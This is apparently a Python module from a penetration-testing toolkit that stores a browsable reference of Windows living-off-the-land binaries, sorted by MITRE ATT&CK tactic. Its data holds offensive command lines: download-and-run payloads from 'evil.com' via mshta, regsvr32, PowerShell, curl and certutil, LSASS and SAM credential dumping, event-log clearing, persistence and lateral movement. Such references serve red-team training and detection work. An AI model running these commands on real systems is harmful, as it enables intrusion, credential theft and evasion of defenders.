"""LOLBins and Beyond Reference Module

Living Off The Land Binaries (LOLBins) are legitimate Windows binaries that can be
abused for malicious purposes. This module provides a comprehensive reference of
LOLBins organized by function and MITRE ATT&CK techniques.

Reference: https://github.com/sheimo/awesome-lolbins-and-beyond
"""

from typing import Dict, List, Any, Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.text import Text


class LOLBinsDatabase:
    """LOLBins database and reference"""
    
    def __init__(self):
        self.lolbins = self._initialize_database()
    
    def _initialize_database(self) -> Dict[str, Dict[str, Any]]:
        """Initialize LOLBins database"""
        return {
            'Execution': {
                'mshta.exe': {
                    'description': 'Microsoft HTML Application Host - Execute HTA files',
                    'techniques': ['T1218.005'],
                    'examples': [
                        'mshta.exe http://evil.com/payload.hta',
                        'mshta.exe javascript:alert("XSS")',
                        'mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd.exe")'
                    ],
                    'use_cases': ['Code execution', 'Bypass application whitelisting']
                },
                'rundll32.exe': {
                    'description': 'Execute DLL functions',
                    'techniques': ['T1218.011'],
                    'examples': [
                        'rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe',
                        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert("XSS");',
                        'rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall'
                    ],
                    'use_cases': ['DLL execution', 'Code execution', 'Bypass detection']
                },
                'regsvr32.exe': {
                    'description': 'Register DLLs - Can execute DLLs',
                    'techniques': ['T1218.010'],
                    'examples': [
                        'regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll',
                        'regsvr32.exe /s /u /i:http://evil.com/file.sct scrobj.dll',
                        'regsvr32.exe /s /n /u /i:file.sct scrobj.dll'
                    ],
                    'use_cases': ['Code execution', 'Bypass application whitelisting']
                },
                'wmic.exe': {
                    'description': 'Windows Management Instrumentation Command-line',
                    'techniques': ['T1047', 'T1569'],
                    'examples': [
                        'wmic process call create "calc.exe"',
                        'wmic /node:target process call create "cmd.exe /c whoami"',
                        'wmic process where name="notepad.exe" delete',
                        'wmic product get name'
                    ],
                    'use_cases': ['Remote execution', 'Process management', 'Discovery']
                },
                'powershell.exe': {
                    'description': 'PowerShell - Script execution engine',
                    'techniques': ['T1059.001'],
                    'examples': [
                        'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/script.ps1\')"',
                        'powershell.exe -EncodedCommand <base64>',
                        'powershell.exe -File script.ps1',
                        'powershell.exe -Command "Invoke-Expression (Get-Content script.ps1)"'
                    ],
                    'use_cases': ['Code execution', 'Script execution', 'Lateral movement']
                },
                'cmd.exe': {
                    'description': 'Command Prompt',
                    'techniques': ['T1059.003'],
                    'examples': [
                        'cmd.exe /c whoami',
                        'cmd.exe /c "powershell.exe -Command IEX(...)"',
                        'cmd.exe /c start /b calc.exe'
                    ],
                    'use_cases': ['Command execution', 'Process spawning']
                },
                'cscript.exe': {
                    'description': 'Windows Script Host - Execute VBScript/JScript',
                    'techniques': ['T1059.005'],
                    'examples': [
                        'cscript.exe script.vbs',
                        'cscript.exe //E:JScript script.js',
                        'cscript.exe //E:VBScript script.vbs'
                    ],
                    'use_cases': ['Script execution', 'Code execution']
                },
                'wscript.exe': {
                    'description': 'Windows Script Host - Execute scripts',
                    'techniques': ['T1059.005'],
                    'examples': [
                        'wscript.exe script.vbs',
                        'wscript.exe //E:JScript script.js'
                    ],
                    'use_cases': ['Script execution', 'Code execution']
                }
            },
            'Lateral Movement': {
                'psexec.exe': {
                    'description': 'Sysinternals PsExec - Remote execution',
                    'techniques': ['T1021.002'],
                    'examples': [
                        'psexec.exe \\\\target -u user -p pass cmd.exe',
                        'psexec.exe \\\\target -s cmd.exe /c whoami',
                        'psexec.exe \\\\target -h -u user -p pass -d cmd.exe'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'sc.exe': {
                    'description': 'Service Control - Manage services',
                    'techniques': ['T1569.002'],
                    'examples': [
                        'sc \\\\target create service binPath= "cmd.exe /c calc.exe"',
                        'sc \\\\target start service',
                        'sc \\\\target stop service',
                        'sc \\\\target delete service'
                    ],
                    'use_cases': ['Remote service creation', 'Lateral movement']
                },
                'wmic.exe': {
                    'description': 'WMI for remote execution',
                    'techniques': ['T1047', 'T1021.006'],
                    'examples': [
                        'wmic /node:target process call create "cmd.exe /c whoami"',
                        'wmic /node:target /user:user /password:pass process call create "calc.exe"',
                        'wmic /node:target process list'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'winrs.exe': {
                    'description': 'Windows Remote Shell',
                    'techniques': ['T1021.006'],
                    'examples': [
                        'winrs -r:target -u:user -p:pass cmd.exe',
                        'winrs -r:target cmd.exe /c whoami'
                    ],
                    'use_cases': ['Remote execution', 'Lateral movement']
                },
                'schtasks.exe': {
                    'description': 'Task Scheduler - Create/run tasks',
                    'techniques': ['T1053.005'],
                    'examples': [
                        'schtasks /create /s target /u user /p pass /tn task /tr "cmd.exe /c calc.exe" /sc onstart',
                        'schtasks /run /s target /u user /p pass /tn task',
                        'schtasks /create /tn task /tr "powershell.exe -File script.ps1" /sc daily'
                    ],
                    'use_cases': ['Remote execution', 'Persistence', 'Lateral movement']
                }
            },
            'Credential Access': {
                'mimikatz.exe': {
                    'description': 'Credential extraction tool',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                        'mimikatz.exe "lsadump::sam"',
                        'mimikatz.exe "lsadump::secrets"'
                    ],
                    'use_cases': ['Credential dumping', 'LSASS memory access']
                },
                'rundll32.exe': {
                    'description': 'Can be used with comsvcs.dll for LSASS dumping',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> dump.dmp full',
                        'rundll32.exe comsvcs.dll MiniDump <PID> dump.dmp full'
                    ],
                    'use_cases': ['LSASS dumping', 'Credential extraction']
                },
                'taskmgr.exe': {
                    'description': 'Task Manager - Can dump LSASS',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'Right-click lsass.exe → Create dump file',
                        'Use Task Manager GUI to dump process'
                    ],
                    'use_cases': ['LSASS dumping', 'Credential extraction']
                },
                'procdump.exe': {
                    'description': 'Sysinternals ProcDump - Process dumping',
                    'techniques': ['T1003.001'],
                    'examples': [
                        'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                        'procdump.exe -ma <PID> process.dmp'
                    ],
                    'use_cases': ['Process dumping', 'LSASS dumping']
                },
                'vaultcmd.exe': {
                    'description': 'Windows Vault credential access',
                    'techniques': ['T1555.003'],
                    'examples': [
                        'vaultcmd /list',
                        'vaultcmd /listcreds:"Windows Credentials"'
                    ],
                    'use_cases': ['Credential access', 'Vault enumeration']
                },
                'cmdkey.exe': {
                    'description': 'Manage stored credentials',
                    'techniques': ['T1555.003'],
                    'examples': [
                        'cmdkey /list',
                        'cmdkey /add:target /user:user /pass:pass'
                    ],
                    'use_cases': ['Credential management', 'Credential access']
                }
            },
            'Discovery': {
                'net.exe': {
                    'description': 'Network commands - Discovery',
                    'techniques': ['T1018', 'T1087', 'T1135'],
                    'examples': [
                        'net view /domain',
                        'net view \\\\target',
                        'net group /domain',
                        'net localgroup administrators',
                        'net user',
                        'net share'
                    ],
                    'use_cases': ['Network discovery', 'Account discovery', 'Share discovery']
                },
                'nltest.exe': {
                    'description': 'Domain trust testing',
                    'techniques': ['T1482'],
                    'examples': [
                        'nltest /dclist:domain',
                        'nltest /domain_trusts',
                        'nltest /dsgetdc:domain'
                    ],
                    'use_cases': ['Domain discovery', 'Trust enumeration']
                },
                'systeminfo.exe': {
                    'description': 'System information',
                    'techniques': ['T1082'],
                    'examples': [
                        'systeminfo',
                        'systeminfo /s target',
                        'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'
                    ],
                    'use_cases': ['System information discovery']
                },
                'whoami.exe': {
                    'description': 'User identity information',
                    'techniques': ['T1087.001'],
                    'examples': [
                        'whoami',
                        'whoami /all',
                        'whoami /groups',
                        'whoami /priv'
                    ],
                    'use_cases': ['Account discovery', 'Privilege enumeration']
                },
                'quser.exe': {
                    'description': 'Query user sessions',
                    'techniques': ['T1033'],
                    'examples': [
                        'quser',
                        'quser /server:target',
                        'quser /server:target /user:user'
                    ],
                    'use_cases': ['Session discovery']
                },
                'qwinsta.exe': {
                    'description': 'Display session information',
                    'techniques': ['T1033'],
                    'examples': [
                        'qwinsta',
                        'qwinsta /server:target'
                    ],
                    'use_cases': ['Session discovery']
                },
                'arp.exe': {
                    'description': 'ARP cache - Network discovery',
                    'techniques': ['T1018'],
                    'examples': [
                        'arp -a',
                        'arp -a | findstr "192.168"'
                    ],
                    'use_cases': ['Network discovery']
                },
                'ipconfig.exe': {
                    'description': 'Network configuration',
                    'techniques': ['T1018'],
                    'examples': [
                        'ipconfig /all',
                        'ipconfig /displaydns'
                    ],
                    'use_cases': ['Network discovery']
                },
                'nslookup.exe': {
                    'description': 'DNS queries',
                    'techniques': ['T1590.002'],
                    'examples': [
                        'nslookup domain.com',
                        'nslookup -type=MX domain.com'
                    ],
                    'use_cases': ['DNS discovery']
                }
            },
            'Persistence': {
                'schtasks.exe': {
                    'description': 'Scheduled tasks',
                    'techniques': ['T1053.005'],
                    'examples': [
                        'schtasks /create /tn task /tr "cmd.exe /c calc.exe" /sc onlogon',
                        'schtasks /create /tn task /tr "powershell.exe -File script.ps1" /sc daily /st 00:00',
                        'schtasks /run /tn task',
                        'schtasks /delete /tn task /f'
                    ],
                    'use_cases': ['Persistence', 'Scheduled execution']
                },
                'sc.exe': {
                    'description': 'Service creation',
                    'techniques': ['T1543.003'],
                    'examples': [
                        'sc create service binPath= "cmd.exe /c calc.exe" start= auto',
                        'sc config service start= auto',
                        'sc start service'
                    ],
                    'use_cases': ['Persistence', 'Service creation']
                },
                'reg.exe': {
                    'description': 'Registry modification',
                    'techniques': ['T1547.001'],
                    'examples': [
                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v key /t REG_SZ /d "cmd.exe /c calc.exe"',
                        'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v key /t REG_SZ /d "powershell.exe -File script.ps1"',
                        'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                    ],
                    'use_cases': ['Persistence', 'Registry run keys']
                },
                'wmic.exe': {
                    'description': 'WMI event subscriptions',
                    'techniques': ['T1053.003'],
                    'examples': [
                        'wmic /namespace:\\\\root\\subscription PATH __EventFilter Create',
                        'wmic /namespace:\\\\root\\subscription PATH __EventConsumer Create',
                        'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding Create'
                    ],
                    'use_cases': ['Persistence', 'WMI event subscriptions']
                }
            },
            'Defense Evasion': {
                'certutil.exe': {
                    'description': 'Certificate utility - Can download/encode files',
                    'techniques': ['T1105', 'T1027'],
                    'examples': [
                        'certutil.exe -urlcache -split -f http://evil.com/file.exe file.exe',
                        'certutil.exe -encode file.exe file.b64',
                        'certutil.exe -decode file.b64 file.exe',
                        'certutil.exe -dump file.exe'
                    ],
                    'use_cases': ['File download', 'Obfuscation', 'Bypass detection']
                },
                'bitsadmin.exe': {
                    'description': 'Background Intelligent Transfer Service',
                    'techniques': ['T1105'],
                    'examples': [
                        'bitsadmin /transfer job http://evil.com/file.exe C:\\temp\\file.exe',
                        'bitsadmin /create job',
                        'bitsadmin /addfile job http://evil.com/file.exe C:\\temp\\file.exe',
                        'bitsadmin /resume job'
                    ],
                    'use_cases': ['File download', 'Bypass detection']
                },
                'curl.exe': {
                    'description': 'Download files',
                    'techniques': ['T1105'],
                    'examples': [
                        'curl.exe http://evil.com/file.exe -o file.exe',
                        'curl.exe -s http://evil.com/script.ps1 | powershell.exe'
                    ],
                    'use_cases': ['File download']
                },
                'wget.exe': {
                    'description': 'Download files',
                    'techniques': ['T1105'],
                    'examples': [
                        'wget.exe http://evil.com/file.exe -O file.exe'
                    ],
                    'use_cases': ['File download']
                },
                'findstr.exe': {
                    'description': 'Search strings - Can be used for file operations',
                    'techniques': ['T1083'],
                    'examples': [
                        'findstr /s /i password *.txt',
                        'findstr /s /i "password" C:\\Users\\*.txt'
                    ],
                    'use_cases': ['File search', 'Credential hunting']
                },
                'wevtutil.exe': {
                    'description': 'Event log utility',
                    'techniques': ['T1070.001'],
                    'examples': [
                        'wevtutil.exe cl Security',
                        'wevtutil.exe cl System',
                        'wevtutil.exe cl Application',
                        'wevtutil.exe qe Security /c:1'
                    ],
                    'use_cases': ['Log clearing', 'Defense evasion']
                },
                'bcdedit.exe': {
                    'description': 'Boot configuration - Can disable security',
                    'techniques': ['T1562.009'],
                    'examples': [
                        'bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures',
                        'bcdedit.exe /set {current} recoveryenabled no'
                    ],
                    'use_cases': ['Disable recovery', 'Defense evasion']
                }
            },
            'Collection': {
                'robocopy.exe': {
                    'description': 'Robust file copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'robocopy C:\\Users\\user\\Documents \\\\target\\share\\docs /E',
                        'robocopy C:\\Data \\\\target\\share /MIR'
                    ],
                    'use_cases': ['Data collection', 'File exfiltration']
                },
                'xcopy.exe': {
                    'description': 'Extended copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'xcopy C:\\Users\\user\\Documents \\\\target\\share\\docs /E /I',
                        'xcopy C:\\Data \\\\target\\share /E /Y'
                    ],
                    'use_cases': ['Data collection', 'File exfiltration']
                },
                'copy.exe': {
                    'description': 'File copy',
                    'techniques': ['T1030'],
                    'examples': [
                        'copy file.txt \\\\target\\share\\file.txt',
                        'copy C:\\Users\\*.txt \\\\target\\share\\'
                    ],
                    'use_cases': ['File copy', 'Data collection']
                }
            }
        }
    
    def search(self, query: str) -> List[Dict[str, Any]]:
        """Search LOLBins by name or description"""
        results = []
        query_lower = query.lower()
        
        for category, bins in self.lolbins.items():
            for name, info in bins.items():
                if query_lower in name.lower() or query_lower in info['description'].lower():
                    results.append({
                        'category': category,
                        'name': name,
                        'info': info
                    })
        
        return results
    
    def get_by_category(self, category: str) -> Dict[str, Any]:
        """Get all LOLBins in a category"""
        return self.lolbins.get(category, {})
    
    def get_bin(self, name: str) -> Optional[Dict[str, Any]]:
        """Get specific LOLBin information"""
        for category, bins in self.lolbins.items():
            if name in bins:
                return bins[name]
        return None
    
    def get_categories(self) -> List[str]:
        """Get all categories"""
        return list(self.lolbins.keys())


class LOLBinsModule:
    """LOLBins Reference Module for TUI"""
    
    def __init__(self):
        self.database = LOLBinsDatabase()
    
    def run(self, console: Console, session_data: dict):
        """Run LOLBins module"""
        while True:
            console.print(Panel(
                "[bold]LOLBins and Beyond Reference[/bold]\n\n"
                "Living Off The Land Binaries - Legitimate Windows tools for lateral movement.",
                title="Module 9",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Search LOLBins")
            table.add_row("2", "Browse by Category")
            table.add_row("3", "Execution LOLBins")
            table.add_row("4", "Lateral Movement LOLBins")
            table.add_row("5", "Credential Access LOLBins")
            table.add_row("6", "Discovery LOLBins")
            table.add_row("7", "Persistence LOLBins")
            table.add_row("8", "Defense Evasion LOLBins")
            table.add_row("9", "Collection LOLBins")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], default='0')
            
            if choice == '0':
                break
            elif choice == '1':
                self._search_lolbins(console)
            elif choice == '2':
                self._browse_category(console)
            elif choice == '3':
                self._show_category(console, 'Execution')
            elif choice == '4':
                self._show_category(console, 'Lateral Movement')
            elif choice == '5':
                self._show_category(console, 'Credential Access')
            elif choice == '6':
                self._show_category(console, 'Discovery')
            elif choice == '7':
                self._show_category(console, 'Persistence')
            elif choice == '8':
                self._show_category(console, 'Defense Evasion')
            elif choice == '9':
                self._show_category(console, 'Collection')
            
            console.print()
    
    def _search_lolbins(self, console: Console):
        """Search LOLBins"""
        console.print("\n[bold cyan]Search LOLBins[/bold cyan]\n")
        
        query = Prompt.ask("Search query")
        results = self.database.search(query)
        
        if not results:
            console.print("[yellow]No results found[/yellow]")
            return
        
        console.print(f"\n[green]Found {len(results)} result(s):[/green]\n")
        
        for result in results:
            self._display_bin(console, result['name'], result['info'], result['category'])
    
    def _browse_category(self, console: Console):
        """Browse by category"""
        console.print("\n[bold cyan]Browse by Category[/bold cyan]\n")
        
        categories = self.database.get_categories()
        category = Prompt.ask("Category", choices=categories)
        
        self._show_category(console, category)
    
    def _show_category(self, console: Console, category: str):
        """Show LOLBins in a category"""
        console.print(f"\n[bold cyan]{category} LOLBins[/bold cyan]\n")
        
        bins = self.database.get_by_category(category)
        if not bins:
            console.print("[yellow]No LOLBins in this category[/yellow]")
            return
        
        # Show list
        table = Table(title=f"{category} LOLBins", box=box.ROUNDED)
        table.add_column("Binary", style="cyan")
        table.add_column("Description", style="white")
        table.add_column("Techniques", style="dim white")
        
        for name, info in bins.items():
            techniques = ', '.join(info.get('techniques', []))
            table.add_row(name, info['description'][:60], techniques)
        
        console.print(table)
        
        # Show details for selected bin
        if Confirm.ask("\n[bold]View details for a binary?[/bold]", default=False):
            bin_name = Prompt.ask("Binary name", choices=list(bins.keys()))
            self._display_bin(console, bin_name, bins[bin_name], category)
    
    def _display_bin(self, console: Console, name: str, info: Dict[str, Any], category: str):
        """Display detailed information about a LOLBin"""
        console.print(f"\n[bold cyan]{name}[/bold cyan] - {category}\n")
        console.print(f"[bold]Description:[/bold] {info['description']}\n")
        
        if info.get('techniques'):
            console.print(f"[bold]MITRE ATT&CK Techniques:[/bold] {', '.join(info['techniques'])}\n")
        
        if info.get('use_cases'):
            console.print("[bold]Use Cases:[/bold]")
            for use_case in info['use_cases']:
                console.print(f"  • {use_case}")
            console.print()
        
        if info.get('examples'):
            console.print("[bold]Examples:[/bold]")
            for i, example in enumerate(info['examples'], 1):
                console.print(f"  {i}. [cyan]{example}[/cyan]")
            console.print()
